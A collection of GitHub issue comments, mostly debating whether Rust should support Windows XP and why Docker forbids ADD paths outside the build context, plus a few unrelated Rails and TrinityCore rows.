rails/rails/5228/452562187,"@friend I was arguing in a convoluted metaphor that the default convention should protect newbie developers (""babies"") from hackers (""pedophiles and rapists"".) Reading the comment now, I do agree it was in poor taste. The analogies were an attempt to make a dry concept humorous, and in retrospect I see can how the comment can be seen as inappropriate. It's been six years since I made that comment, and I was a naive 21-year-old at the time, so please forgive me. ",,False,False,5228
rails/rails/5228/452595508,"@friend Yeah it's OK, just maybe not speak like that elsewhere or your account might be taken down 😉 ",,False,False,5228
TrinityCore/TrinityCore/20683/267445916,Description Initiate Emeline and Initiate Colin should talk every once in a while. Branch(es) both. TC rev. hash/commit 7dc97c035350f9505a9fba0b8ec2d2037044e586 TDB version 335.63 Suggested fix ,,False,False,20683
rust/rust-lang/12842/29251641,"I've made some investigation recently, and found that, there are only two APIs which are not supported by Windows XP, throughout the repo tree. There are  CreateSymbolicLinkW, only used by nativeiofilesymlink() GetFinalPathNameByHandleW, only used by nativeiofilereadlink()  And nativeiofile{symlink,readlink} are never used throughout the repo tree, except stdiofs{symlink,readlink} (which are really never used). Do we really need including symlink/readlink functionality inside std? How other languages do? Currently Windows XP is still wildly used in the world, especially in Asia. Its installed volume is much more than Mac OS + Linux + Unix. We give up supporting XP just because of two api absent? Maybe it's wrong. cc #11950 update readlink is used by rustcmetadatafilesearch. update This is my branch   I just commented out the usage of CreateSymbolicLinkW and GetFinalPathNameByHandleW. This make the new rustc.exe run successfully in Windows XP, ant it works mostly OK (see my latest comment below). ",,False,False,12842
rust/rust-lang/12842/37393894,I thought there were mutex and condition variable APIs that are not supported on windows XP too? ,,False,False,12842
rust/rust-lang/12842/37394264,"@friend  After remove CreateSymbolicLinkW and GetFinalPathNameByHandleW, I've made rustc run in XP (it works ok). More investigation need to be done perhaps. ",,False,False,12842
rust/rust-lang/12842/37394364,"Oh, really? Does it pass tests? (cc  ) ",,False,False,12842
rust/rust-lang/12842/37395135,"I don't know. On Windows platform (even Win7),  always fails. see #12745 ",,False,False,12842
rust/rust-lang/12842/37395206,"or even just  should pass (at least, they pass on the buildbots). ",,False,False,12842
rust/rust-lang/12842/37395322,"I'll have a try. Thank you! @friend In general, a .exe can't be start up, if it includes unsupported APIs in Import Table. Before i remove CreateSymbolicLinkW and GetFinalPathNameByHandleW from source, rustc can't be start up in XP; after removing, the new rustc runs normally. So I think, rustc doesn't require other unsupported API. Will prove it. Update my new rustc.exe can be loaded successfully by depends.exe in XP. Yes, It has no other dependency. ",,False,False,12842
rust/rust-lang/12842/37399067,"@friend  run-pass [stage2] test\run-pass\exponential-notation.rs task '&lt;main&gt;' failed at 'called  on a  value', D\MinGW\msys\1.0\home\LIIGO\rust\rust\src\libstd \option.rs148 make *** [i686-pc-mingw32/test/run_pass_stage2_driver-i686-pc-mingw32.out] Error 101 make check-stage2-stdCreateSymbolicLinkWGetFinalPathNameByHandleW`. ",,False,False,12842
rust/rust-lang/12842/37400663,Might be an issue with UTF8 or floating point arithmetic on XP? ,,False,False,12842
rust/rust-lang/12842/37404388,"@friend Are you sure? I've compiled the std and its tests from source in Windows XP using my new rustc.exe. Compiled OK,  most tests passed, and some tests failed (1276 passed; 41 failed; 134 ignored) (Looks like all failures are from libgreen and libnative. But I don't know why currently.) ",,False,False,12842
rust/rust-lang/12842/37404548,I just looked at that test you failed for uses of Option.unwrap. Was trying to suggest why the test was failing even though you didn't change anything. ,,False,False,12842
rust/rust-lang/12842/37421743,"Thank you! 2014年3月12日 下午853于 ""Ben Harris"" notifications@friend.com写道： ",,False,False,12842
rust/rust-lang/12842/37448049,"@friend Rust doesn't expose native condition variables yet. When it does, that's another API that's missing on XP. I don't think Rust should support an operating system not receiving security updates because encouraging any continued use of it is irresponsible. I don't think we should add a further burden to working on the concurrency and I/O implementation. It's already very hard to improve because libuv defines a lowest common denominator it needs to support, and XP would be another. ",,False,False,12842
rust/rust-lang/12842/37489072,"@friend I disagree with you. C, C++, Java, C#, Python, Ruby, Scala, and many more, all support Windows XP. ",,False,False,12842
rust/rust-lang/12842/37490527,"Without knowing much about it, it doesn't look too onerous to take some functions out of the extern block and replace them with a  call and checking for null. Probably worth writing up an RFC if you want XP to be supported properly. It will end up with lots of . ",,False,False,12842
rust/rust-lang/12842/37502619,"@friend plus one @friend most of those don't claim any sort of safety guarantees, some are laughably worse than others (I'm looking at you, Java) and I don't expect any of them (maybe Scala?) to have condition variables in core libraries. @friend runtime failure based on feature set is unacceptable, at worst I'd expect to see two different OSes for Windows,  having features disabled in libraries via  (and lowering the minimum API level somewhere, I know there is such a thing on Windows). ",,False,False,12842
rust/rust-lang/12842/37503103,"Supporting Windows XP means Rust will need a homegrown implementation of condition variable, among other problems. It won't be possible for it to be included in the generic Windows target without performance hits because branches + bloated code aren't always acceptable. I think it's unethical to care about usage share to the point where users are encouraged to remain on an insecure platform without security updates. If Apple or Microsoft isn't providing support, then we shouldn't be providing support. It gives us a nice gradual deprecation policy where we can actually migrate to new win32 APIs, etc. but I think the more important issue is the security one. To be honest, I can't really think of a use case for an XP target beyond malware development. It's not like XP users are going to buy your products or consider open-source software. ",,False,False,12842
rust/rust-lang/12842/37526444,"Lucky for the malware developers, I imagine   will allow them to write safe concurrent malware in rust for windows xp. ",,False,False,12842
rust/rust-lang/12842/37611829,"I agree with @friend, Windows XP is about to reach the end of it's already significantly extended support lifetime, and has been without mainstream support for almost 5 years now. Bending over backwards for it is just not worth it. At the age of 13, XP is stupidly old. If there are small, unobtrusive changes you can make so rustc still works on XP, then fine, but official support doesn't make sense. We don't even list BSD as an officially supported build environment, and that's an actively-developed OS! ",,False,False,12842
rust/rust-lang/12842/37622936,"I plus one the drop of XP. It is like using IE6 polyfills when doing web developement, not only you do have to include more hacks to support it but it is also making users believe they have a viable platform. Which is not the case. ",,False,False,12842
rust/rust-lang/12842/37627817,Although the experiment of making it run on XP may be fun (?) I don't think we should add official support for it (again?).  @friend @friend any thoughts about this ? ,,False,False,12842
rust/rust-lang/12842/37680628,"Although I personally agree that official XP support should be dropped, it may be worth asking some video game developers for their opinions.  I'm not a hard core gamer, but I believe there is still a significant number of gamers that use XP due to some performance issues in Windows 7 and 8.  Of course by the time Rust is actually used in a commercial game this may have changed.  Rust shouldn't do anything that may alienate the video game development crowd. ",,False,False,12842
rust/rust-lang/12842/37689497,"Personally, I am happy to take patches that improve compatibility with xp as long as it doesn't have a big impact on the design. Having a design that is compatible with diverse environments is good for more than just xp. The issues preventing Rust from working on xp appear minor and solvable. I don't want to 'officially' support xp though. ",,False,False,12842
rust/rust-lang/12842/37690132,"@friend Removing symlink/readlink functionality or leaving out native condition variables (as we currently do) would hurt the quality of the project elsewhere. If XP is going to be supported, it needs a separate target to use in  or at least stubbed out functionality that's conditionally linked against. ",,False,False,12842
rust/rust-lang/12842/37744757,"Libuv has itself condition variables implementation to Support XP. 2014年3月15日 上午411于 ""Daniel Micay"" notifications@friend.com写道： ",,False,False,12842
rust/rust-lang/12842/42272857,I don't think it's acceptable to have a hard dependency on libuv for binaries not using libgreen. It doesn't make sense to add a whole bunch of overhead to support a dead operating system... I doubt that the libuv implementation of condition variables is efficient. ,,False,False,12842
rust/rust-lang/12842/42386036,"We could design a symlink api that can report ""not supported"". On Mar 14, 2014 111 PM, ""Daniel Micay"" notifications@friend.com wrote ",,False,False,12842
rust/rust-lang/12842/44311734,There is a new non-XP symbol in . ,,False,False,12842
rust/rust-lang/12842/61780086,[llvm-dev] RFC Drop support running LLVM on Windows XP ,,False,False,12842
rust/rust-lang/12842/66014423,"@friend plus one  I'm currently developing a program for customers using Windows XP, and the decision can not be made by me to upgrade their OS. So for now I have to choose golang. Just like oracle dropped support for java6, then RedHat picked it up, because too many clients are still using java6. ",,False,False,12842
rust/rust-lang/12842/75184834,We aren't even supporting VIsta right now. ,,False,False,12842
rust/rust-lang/12842/76660839,Servo was expected to be run in Windows XP [2015-01-01]  ,,False,False,12842
rust/rust-lang/12842/76667761,"To be clear, that discussion is not about running the servo rendering engine on windows xp (it doesn't run on any version of windows atm, aiui), but rather some components written in Rust to be incorporated into Gecko. The distinction is somewhat important because the components may be restricted enough to not use any of the major features XP is missing, meaning that reaching level of support needed for that purpose may not be (a) very hard, and (b) may not be enough for many other applications. ",,False,False,12842
rust/rust-lang/12842/76674381,"FWIW, here's a list of APIs used by libstd, that are missing on Windows XP AcquireSRWLockExclusive AcquireSRWLockShared CancelIoEx ReleaseSRWLockExclusive ReleaseSRWLockShared SetFileInformationByHandle SetThreadStackGuarantee SleepConditionVariableSRW TryAcquireSRWLockExclusive TryAcquireSRWLockShared WakeAllConditionVariable WakeConditionVariable ",,False,False,12842
rust/rust-lang/12842/77077073,"Hi, thanks for the list, that's quite useful to have if that's all of them. Personally I'd like to see a full Rust core toolchain working on XP, since that's the best way to know that things are working reasonably; we can just run the existing test suite.  You could then run Rust compiler in an XP VM if you want. Problem there of course is LLVM unhelpfully dropping support for XP.  Might be good to keep tabs on what incompatibilities that's trying to bring in, and maybe maintain an XP compatible version of LLVM as well (ought to be a lot easier than trying to backport later).  I reckon the wider open source community would be interested in this when they realise compilers they use no longer function on XP. Main question I think is whether backwards compatible alternatives to those APIs should just replace whatever's there currently or should be included only when those APIs aren't available (be it just XP or Vista also).  Benefit of dropping them completely is that the same code is then being run and tested on Win7 as on XP/Vista, so things seem more likely to work across the board (and more consistently) and there's no chance of Rust's software architecture for XP needing to be different.  Downside is that use of these APIs might be more efficient and some features/capabilities may be lost.  It might even be required to use certain APIs to get things working in Vista/Win7 which don't exist in XP. Indeed the best approach might be to avoid new APIs unless they're either non-essential (e.g. a security feature that should be enabled) or actually required for correct functioning on the newer OS since there is no alternative.  N.B. such alternatives may be considerably more complex than 'convenience' APIs involving a lot more manual coding or restructuring; however compatibility is highly valuable and custom code using simpler primitives permits much more flexibility in the implementation (which you definitely can't get if you rely on OS code to do all the work). Indeed it is possible to write code which outperforms the OS and maybe even avoids any use of expensive system calls at all.  Given this is a compiler for what claims to be a systems programming language, it doesn't make a lot of sense to rely on high level OS functions in the first place, if there are ways to achieve the same within the Rust system core, using low level primitives.  As such, similar arguments may apply to use of certain syscalls/libraries in Linux. Needless to say, writing a Rust OS becomes easier the more stuff libstd can do without OS support for a particular CPU architecture (and anything that works in both Windows and Linux should work on a Rust OS too).  Synchronisation between threads is definitely something I'd expect to be in that category. ",,False,False,12842
rust/rust-lang/12842/84199968,"Please, please consider this. I regularly develop for customers using Windows XP. The situation is pretty common in controls engineering and chemical engineering. The ability to emit executables that run on XP is valuable. Even a separate target for XP that lacked mutexes and condition variables would be mildly useful, although I've read interesting emulation methods for condition variables. ",,False,False,12842
rust/rust-lang/12842/99903852,"I think attitude is important. Kicking out XP would be a mistake after all, because XP will survive a lot longer than your expectation, owing to the virtual machines. XP is insecure, yes, but nothing is 100% secure. Warm acceptance is very important, if you want your beloved Rust-lang to become a true descendant of C/C++. ",,False,False,12842
rust/rust-lang/12842/114403605,Firefox want to integrate some Rust code or library (such as mp4 parser and url parser). But Firefox is still required to be run in Windows XP as before. This is another reason for Rust to support XP. ,,False,False,12842
rust/rust-lang/12842/115021126,"I'd love to use Rust at work and am currently exploring use-cases where that might be possible. However, I definitely need Windows XP support to work for the projects I'm working on. I don't need the compiler/toolchain to work on XP, but the produced executables should definitely run on XP. I can totally accept some APIs not being available on XP (not sure how to mark that during compilation though). But having a Hello World program crash at start with ""AquireSRWLockExclusive could not be located in kernel32.dll."" is bad. I would be glad if you could you reconsider at least partial support for XP. ",,False,False,12842
rust/rust-lang/12842/115025282,I will work on adding support for XP soon. ,,False,False,12842
rust/rust-lang/12842/115031408,@friend Thank you! Can I track this progress somewhere? I would love to be up-to-date on this ) ,,False,False,12842
rust/rust-lang/12842/115032683,@friend I'll keep this issue updated on any work I do towards this. ,,False,False,12842
rust/rust-lang/12842/115045458,"@friend awesome! I was also planning on getting XP working soon, so if you have any questions feel free to reach out to me on IRC. ",,False,False,12842
rust/rust-lang/12842/115077112,"I disagree with literally every aspect of this.  Hamstringing modern Rust for the sake of an operating system that has been discontinued would be ludicrous.  Rust is an opportunity to get rid of dumb decisions in past languages. Do what you want on Windows XP, but don't take away my modern APIs or their modern implementations. ",,False,False,12842
rust/rust-lang/12842/115086199,"Rust is just a new language - not very plausible to thrive, yet. So Rust needs to support as large community as possible. So giving a simple and easy work-around for XP is necessary. The idea of banning XP completely is a silly and dangerous idea. You don't want your beloved language Rust appears to be obstinate, do you? ",,False,False,12842
rust/rust-lang/12842/115106510,"@friend Supporting an obsolete version of an operating system riddled with zero days and receiving no security updates is actually dangerous and maybe even irresponsible. Besides, PRs are accepted if you want to make something compatible with XP as long as it comes at no perceivable cost for newer versions, there is no ""banning"", it's just not ""necessary"" or high-priority. ",,False,False,12842
rust/rust-lang/12842/115117546,"Killer argument – I think I'll just leave my door open from now on because well, no lock is 100% secure anyway. ",,False,False,12842
rust/rust-lang/12842/115118799," Rust code will not be allowed in Firefox unless Rust supports XP We want Rust in Firefox Therefore, Rust must support Windows XP  ",,False,False,12842
rust/rust-lang/12842/115324420,"For how long will Firefox continue to support XP? When will a Firefox version be released (meant for users, not developers) that contains rust code? ",,False,False,12842
rust/rust-lang/12842/115330525,"@friend Looks like Firefox will continue to support XP indefinitely. As for your other question, there is this tweet ",,False,False,12842
rust/rust-lang/12842/115339510,"I very much doubt that XP will be supported indefinitely. Over the years support for Windows 95, 98, ME, and 2000 (and of those 2000 was actually a quite decent ) ) has been dropped. XP will follow, it's only a matter of time. So given that, is supporting XP really worth it? ",,False,False,12842
rust/rust-lang/12842/115343434,Because XP seems more likely to survive longer than those who want to extinct it. ,,False,False,12842
rust/rust-lang/12842/115343497,"I understand the word ""indefinitely"" to mean that there are no plans to drop support for it, instead of ""forever"". Note that XP is still a very large market, and is said to have more users than desktop Linux. ",,False,False,12842
rust/rust-lang/12842/115344869,"@friend The question is - how much time. Looking at graphs at netmarketshare.com (and looking around!) I can easily imagine it being quite popular in 2020. In this case the support is probably worth it. (I was going to look at Vista/XP support later this year, but since @friend works approximately 100x faster than me, it won't probably be necessary.) ",,False,False,12842
rust/rust-lang/12842/116614355,"First of all Thank you so much for fixing this! This is awesome! plus one Is there a way to detect at compile time or at application init time whether a panic'ing API would be used? If I have an app that should run on Windows XP, I don't want to have to test every code path to make sure some unsupported API doesn't panic... Thanks in advance for your consideration! ) ",,False,False,12842
rust/rust-lang/12842/116663220,"Not currently, no. ",,False,False,12842
rust/rust-lang/12842/116701155,"Is this planned or possible? I think that would be crucial to be able to write code without being ""really careful about which APIs to use"". If I wanted to be careful, I wouldn't choose Rust ;) ",,False,False,12842
rust/rust-lang/12842/116712283,Not currently. You may want to open an issue on the RFCs repo and/or write up an RFC with details on how to do such a thing. ) ,,False,False,12842
rust/rust-lang/12842/116728055,@friend I'm sure I understand this joke Do you mean Rust is too young? ,,False,False,12842
rust/rust-lang/12842/116733443,"I meant ""If I wanted to be careful about which API to call in order to not panic, I wouldn't choose Rust"". I want my rust to ""it compiles, let's ship it"" ;) ",,False,False,12842
rust/rust-lang/12842/116788876,"I'm waiting for the nightly to try out this patch. When I run my Rust program on WinXP at the moment currently I get 'the procedure entry point TryAcquireSRWLockExclusive could not be located in the dynamic link library kernel32.dll' With this patch, I'm wondering, will my program likely just panic out, or may it run. ",,False,False,12842
rust/rust-lang/12842/116795922,"This will take some time to propagate into the nightlies currently. The 32-bit Windows compiler is currently still using MinGW and is unlikely to work on Windows XP (although I have not tested this). The triple I tested was , which we currently cannot build a compiler for due to this LLVM bug. Instead you'd need to build a compiler which can target . We don't currently build nightlies for targets like this either (e.g. we have no android nightlies), but this is also coming soon! tl;dr; to try out XP support you need to do this ",,False,False,12842
rust/rust-lang/12842/116800822,"Thanks a lot! I'll give that a shot, I didn't realise it requires a separate target ",,False,False,12842
rust/rust-lang/12842/116883726,I'm a tad confused I've ended up with a rustc in the stage2 dir you mention however during compilation I got I've tried doing ,,False,False,12842
rust/rust-lang/12842/117239816,"@friend you probably won't get very far if the build doesn't complete, so I'd start out diagnosing why  didn't build. Perhaps a reconfigure was needed? ",,False,False,12842
rust/rust-lang/12842/117272357,"Oh wow it looks like I just totally forgot to commit the file! I'll add it in a PR I'm prepping now, but you can add  with these contents ",,False,False,12842
rust/rust-lang/12842/117283858,"Cheers!  That works for me. In msys2 I did, just so I don't forget ;) ",,False,False,12842
rust/rust-lang/12842/117316709,"Just wondering if anyone can point me in the right direction, I can compile a simple rust program fine, but I'm getting the following error with a more complex one ",,False,False,12842
rust/rust-lang/12842/117330290,The MinGW target seems to work for Windows XP. Or at least  gets this far ` Looks like the test infrastructure already relies on condition variables for something. ,,False,False,12842
rust/rust-lang/12842/117349526,@friend Was that using the latest nightly build then? ,,False,False,12842
moby/moby/2745/22832585,"If you have an add line in the Dockerfile which points to another directory, the build of the image fails with the message ""Forbidden path"". Example Gives I would expect the file to be written to , not . ",,False,False,2745
moby/moby/2745/298188258,"thought I had a good project folder. found out sym links and relative pathing doesn't work. this appears to be just an issue about where to source the files from, so it looks like we have to create two docker files. which is depressing ",,False,False,2745
moby/moby/2745/298190761,"You have to review the Directory and are u familiar with OLE, registry, dos system, before you take into account open source project that is pretty much extensive research. Usually we take into account what needs to be in place before rewriting for open source.I don't know why GitHub came first into a entity catalog. No proposal was in place for the designated  doc to be available. No request was sited. We don't shift the focus on and off so people can generalized on how linear regression analysis should have been to the rest of the world at large. Hope you get my drift!! Wishing the best..... Cheers, -Moderntheory On Apr 29, 2017 207 PM, ""Eric Xanderson"" notifications@friend.com wrote ",,False,False,2745
moby/moby/2745/307592742,So much for running a microservice architecture with multiple repositories and Dockerfiles. / Please reopen. ,,False,False,2745
moby/moby/2745/312158442,"This is something that baffles me also.  I just ran into this limitation, and I can't see any reason for it.  To say this is a security issue due to malicious people placing bad lines in their Dockerfile and then telling people to clone, build, and publish the image is utter and complete nonsense.  If I pull a Dockerfile from the Internet (github or whatever) and blindly follow orders without looking at the file to create an image that I subsequently blindly and naively publish to a public repository, I will reap what I deserve.  To limit the product for that edge case is specious logic at best. It's frustrating to see so many people speaking out with user experiences just to get shut down, ignored, and brushed off by a small number with a concrete, inflexible, uncompromising, and narrow worldview of how they want their software to be.  So many great ideas have withered and died from that kind of creativity-strangulation.  Docker might be on that slate pretty soon, if these frustrations are significant to more than just this one issue. ",,False,False,2745
moby/moby/2745/312350839,  ,,False,False,2745
moby/moby/2745/312450618,"@friend - you hit the nail on the head. i would like to use docker, but this issue is show-stopper for me and I suspect many others. I take responsibility for what software I choose to remotely include as part of my own and I don't need/want authoritative hobblings of what I can do with software and which effectively take away my responsibility with the lame excuse/insult that I (and the larger group of my peers) am irresponsible. I build my own dockers from the ground up anyway so that ""security"" issue does not apply in my case. If they want to continue with this foolishness, they do it at their peril because there are competitors nipping at their heels - I'm just doing my research on  - I haven't yet fully understood if it is the replacement I'm looking for but I suspect it will be the docker killer. ",,False,False,2745
moby/moby/2745/312464210,"@friend @friend @friend  As it has already been mentioned numerous times it's not purely a security issue. Docker has a client-server architecture. Docker builder is currently implemented on the server side. So if you want to use files outside build context you'd have to copy those files to docker server. One things docker newbies don't realize is that you can keep Dockerfile separate from build context. I.e. if you have , ,  you can still set build context to root. But the next thing you'll complain about is that build would take prohibitively long as you now have to copy whole  directory to the machine where docker server resides. ",,False,False,2745
moby/moby/2745/312464420,"@friend Regarding a security issue consider this You're a docker hosting provider (or CI) and allow people to upload their git repositories with Dockerfiles. Since you want to be as efficient as possible, you implement your service with docker containers. If you allow people to reference any files on your server you'd risk that people would be able to expose images to each other. How would you solve this? ",,False,False,2745
moby/moby/2745/312464547,@friend Packer is not a competitor currently. It's a tool to build VM images. Though I can imagine packer to be able to build container images at some point. ,,False,False,2745
moby/moby/2745/312464603,@friend Why aren't you satisfied with my comment? Doesn't it sound reasonable? Do you have any questions remaining? Do you have a solution to the problem I described? ,,False,False,2745
moby/moby/2745/312466247,@friend  You run people's dockers inside their own containers. ,,False,False,2745
moby/moby/2745/312468328,@friend So you propose to use docker in docker to build images? It would be very inefficient and still insecure. The kernel is shared however deep DinD you use and since docker has root privileges it's hackable. ,,False,False,2745
moby/moby/2745/312468377,"Sorry, I don't understand what's the meaning of ""dockers"" here. ",,False,False,2745
moby/moby/2745/312520349,I suppose it could be a Docker in Docker but there are many options for virtualization depending on your platform. ,,False,False,2745
moby/moby/2745/312531622,"@friend So, can that not be done automatically?  If I specify a file out of the context, is it not possible and/or feasible to automatically copy it to the server in order to build it into the image? So, the unfortunate haughty attitude to your ""newbie"" users aside, this is actually what has already been suggested (by @friend  above), and as I stated in my own post, this is the solution I am currently using.  This works for me.  However, if I had multiple, shared config, and my individual docker images were rather big, this would get fairly prohibitive, as it has been stated by others that each docker image would contain the files for every other docker image, even though it would never need them.  I could easily see why people would be frustrated by what they could easily see as stonewalling in refusing to work with users' requests and needs and implement this feature. ",,False,False,2745
moby/moby/2745/312541055,"Won't you as easily see why maintainers be frustrated? If you read the docker history, you'd know that this whole ""docker"" concept was developed in-house (in ""dotCloud"" then) as a tool to efficiently use server resources. No, it's not ""setting up a situation"". It's a historic fact. Sure. Just like in any ""as-a-service"". There would be only one docker daemon, so yes. Otherwise you'd need to set up a separate docker daemon for each user which is impossible on one host (so would require actual virtual machine for each user, rendering containers and docker meaningless for that use case). It is not a security concern for running containers (since kernel isolates them), but it is a security concern when there are no containers yet (when you're building images). You're still saying as if each user runs a separate process. It's a server, remember? There's only one user. And one filesystem. That would require implementing application layer of access control on top of the system one. You're not forced to use docker to build images. Container image format is currently being standardized. So there are other tools you can build images with. When image is build, push it to image registry so that docker can pull it. And I'm sure when the build tool would be extracted out of the server monolith (#32925) relative path use case would be possible as the builder would run in a separate process under ""normal"" user. ",,False,False,2745
moby/moby/2745/313932372,"I'm running into this issue as well in a Go project. Here's how this became a problem for me I want to run a container for developing my server locally, which has the following approximate structure Inside of my Dockerfile, there are two options I can think of here  ADD ../ /go/src/MyOrg Only add the main package and then install the dependencies from the repo  The first option doesn't work because of this bug The second option isn't only awful, but doesn't work because of moby#24489 and MyOrg happens to be bristling with private repos My only other option is to put all the dependencies into the vendor file Now if I ever want to update Dependency/dep.go I have to run a script to manually copy Dependency folder into the vendor folder. Just bizarre. ",,False,False,2745
moby/moby/2745/313932689,"Wouldn't it be trivial for Docker to do quick static analysis and detect whether a relative parent directory is being accessed? Then when you try to run or build it, it would abort saying Even if you can't analyze it before running the Dockerfile, then just abort with the same error message when you encounter the offending instruction. ",,False,False,2745
moby/moby/2745/313968829,"@friend It looks like you want to link statically with some library? For production image, I see 3 solutions 1) Treat it as a thirdparty library with its own release cycle  Publish  using go package manager In  fetch all dependencies using go package manager  2) Treat it as a part of your application with synchronous release cycle  Move  to  Add additional  if you want to release Dependency separately  3) Move Dockerfile to For development image there's a 4th solution 4) Just use docker-compose  use image with Go build tools mount  to  use go command to build normally as you would without docker  ",,False,False,2745
moby/moby/2745/314042060,"Your #2 is a non-solution if the Dependency is used by more than one MyOrg projects, which, if I understand correctly, is the entire point of @friend's setup. 3 also breaks once there is more than one top-level project. That really leaves us with just solution #1, which is a lot of hassle for something that should be a non-issue. Virtually every build system on the planet supports this setup (e.g. CMake's  actually lets you ascent into the parent directory etc.); Docker is the special needs child here ) ",,False,False,2745
moby/moby/2745/314101562,"Dependency management is always an issue. Often there's a temptation to dump everything into one repository (like they do at Facebook and Google), but it's not an option in the open source community. And when you have multiple repositories you must either use git clone or some other package source. The thing is, docker is not a build system. It's not designed as a build tool. Build functionality is only a necessity and it has very limited capability. You can't use multiple Dockerfiles to build one image (without intermediate registry step), you can't import Dockerfile (you can only use other image as a base), there were no multistage builds until recently. So yeah, if you need a build tool, use CMake (or ) and then just add artifacts to the result image. ",,False,False,2745
moby/moby/2745/318703962,So why can't we do this? A tool should not be enforcing it's own ideology onto it's users when it's designed to be as versatile as possible. ,,False,False,2745
moby/moby/2745/319736168,"plus one. Basically I have a JAR file for instrumentation that needs to be in every single micro-service, but is quite large. Due to change in infrastructure (Rancher for orchestration instead of ad-hoc docker scripts) it will no longer be ""easy"" for me to mount the JAR for instrumentation in the target container at runtime, so I need to supply it to Dockerfile and copy it inside the container at build time. Well, the JAR is quite big so it is in the parent directory of all the micro-services directories (each containing their own Dockerfile) Due to this ""limitation"" I am force to copy/clone a 50MB+ JAR into every simple micro-service (10+) directory... Not healthy for my co-workers machines or the Git repository. Providing a flag such as  to docker build would not be outside of the realm of possibility. The Dockerfile would have to be pre-processed before bundling the context to analyse dependencies from outer directories which would then be added to the context bundle, right? In my mind this does not look like a very far-fetched feature-request - but rather quite sensible usage. Cheers Dan ",,False,False,2745
moby/moby/2745/319814959,"Just FYI to anyone here, the best solution I have found so far, was to simply to simply copy the Dockerfile to the root of the project and give the file name a uuid. after building, then just delete the uuid file. worst case is the Dockerfile doesn't get deleted, but it's a uuid, so it shouldn't really matter. I tried symlinks up the wazooo, did not work. Copying the file to the root of the project the uuid isn't as pretty as symlinks, but it does work. ",,False,False,2745
moby/moby/2745/319816125,You can just build the Docker context directly ,,False,False,2745
moby/moby/2745/319828234,If JAR file is static you shouldn't include it to your git repository. Here's a proper way  Build a base image (e.g. ) with JAR file included Create a Jenkins (or other CI) pipeline where you build and push the  image to the registry On each microservice's Dockerfile use base JAR image   ,,False,False,2745
moby/moby/2745/319839656,You can use multi-stage builds; Create a Docker image for your packages (or build several of such images) Dockerfile FROM scratch COPY instrumentation.jar / bash docker build -t my-packagesv1.0.1 -f Dockerfile.packages . Dockerfile FROM my-packagesv1.0.1 AS packages FROM nginxalpine COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar Dockerfile FROM my-packagesv1.0.1 AS packages FROM mysql COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar Dockerfile FROM my-packagesv1.0.1 AS packages FROM my-other-packagesv3.2.1 AS other-packages FROM my-base-image COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar COPY --from=other-packages /foobar-baz.tgz /some/other-path/foobar-baz.tgz ♠ ,,False,False,2745
moby/moby/2745/319994747,"@friend The trick I've used in the past is to use symlinks and then rsync everything with symlink resolution to a separate folder for building. It doesn't really work if you have really large files in your build, but for most use cases it's a workaround that can get the job done. ",,False,False,2745
moby/moby/2745/320093645,  ,,False,False,2745
moby/moby/2745/320101689,"@friend  thanks, I will look into that...I have to support generic building of projects for the purposes of library code, so the stupid trick of copying the Dockerfile to the project is the only lightweight thing I can think of, where the only thing being copied is the Dockerfile itself. Seems dumb but works lol. ",,False,False,2745
moby/moby/2745/321392664,"This is extremely unfortunate. At this point, it's physically impossible for me to add any new ideas, since all of them have already been brought up. But for some reason, the Docker people seem to keep complaining about security aspects. This makes less than zero sense just add an  flag, which is disabled by default. Boom everyone is happy. Can we stop pretending that security is a concern here? If the attack vector is that an attacker somehow convinced me to run  on their , then I think I'm stupid enough that they also could have convinced me to run . ",,False,False,2745
moby/moby/2745/321798792,"I think you're missing one important difference docker runs in a superuser context. And no, you're not supposed to be stupid to be convinced to clone some project from GitHub and run . ",,False,False,2745
moby/moby/2745/323597730,LXDock is interesting  the warning - duly noted and highly appreciated ) ,,False,False,2745
moby/moby/2745/341609059,"5 years later and docker still issues this cryptic error message that rivals ones from nuget. How about at least putting in ""Even though you are in path X when you issued the  command, and your dockerfile has a path relative to X, and you have specified a working directory in the dockerfile, docker is going to be working in path Y (ps. u r stupid noob)"" At least I think that's what the obstacle preventing me from completing a basic walkthrough.  This tech seems great and all, but I shouldn't need to spend a few weeks researching the ins and outs and dealing with 5 year old bugs like this just to try it. ",,False,False,2745
moby/moby/2745/344426031,"This appears to still be a bug, at least is presenting itself today in what feels like a very routine use-case. ",,False,False,2745
moby/moby/2745/344531744,"It certainly feels at first. But not after you learn how to mount your source and build directories, which is a recommended use case for development. You aren't supposed to rebuild your images on every source change. When you're comfortable with development use case, you can proceed to production use case, at which point you create  and use  to point docker builder at the root of your project. Then you realize that not all the files in your project are required for production. You begin to optimize it by creating build image and using build artifacts folder as a context for you production build. Then you learn about multistage builds and which point you're comfortable with a setup you have. If you need to put in your image something else from your HOME folder, like your private ssh keys (not a brightest idea), you can copy them to your project dir (surely you're not worried about security) or even commit them to git. ",,False,False,2745
moby/moby/2745/346336781,I just ran into this issue as well. Is there a reasonable workaround? I just want to mount a folder that is not in the docker folder... ,,False,False,2745
moby/moby/2745/346484336,"All this ""mount"" talk and ""Home folders"".  If anyone is going to fix the error to be more clear, please remember that some of us have C drives and %USERPROFILE%. ",,False,False,2745
moby/moby/2745/346510774,The way it works on Windows is network shares which is kind of a mount. ,,False,False,2745
moby/moby/2745/346537191,"Windows has actually had mounting for a long time, its just transparent to users unlike nix, I just didn't want to be further confused by nix specific messages while trying docker out on windows. Why would I create a network share to run a docker image on the host running on my local machine? That seems ""extra"", but if the error message said that was the problem I would fix it and not come bothering anyone. ",,False,False,2745
moby/moby/2745/346695519,"If you're talking about Docker on Windows, it still uses linux in a VM.  ",,False,False,2745
moby/moby/2745/346695887,When you run  it actually zips your src folder and transfer it to the docker server which executes commands from your . ,,False,False,2745
moby/moby/2745/346696550,"It looks like there are some people who want to reference any files from the . But Dockerfile parsing is done on the docker server. So there's no way it could know which files are referenced. Some people are asking to change message from ""Forbidden path"" to something more understandable. Does the message ""Can't reference files outside build context"" make sense to you? ",,False,False,2745
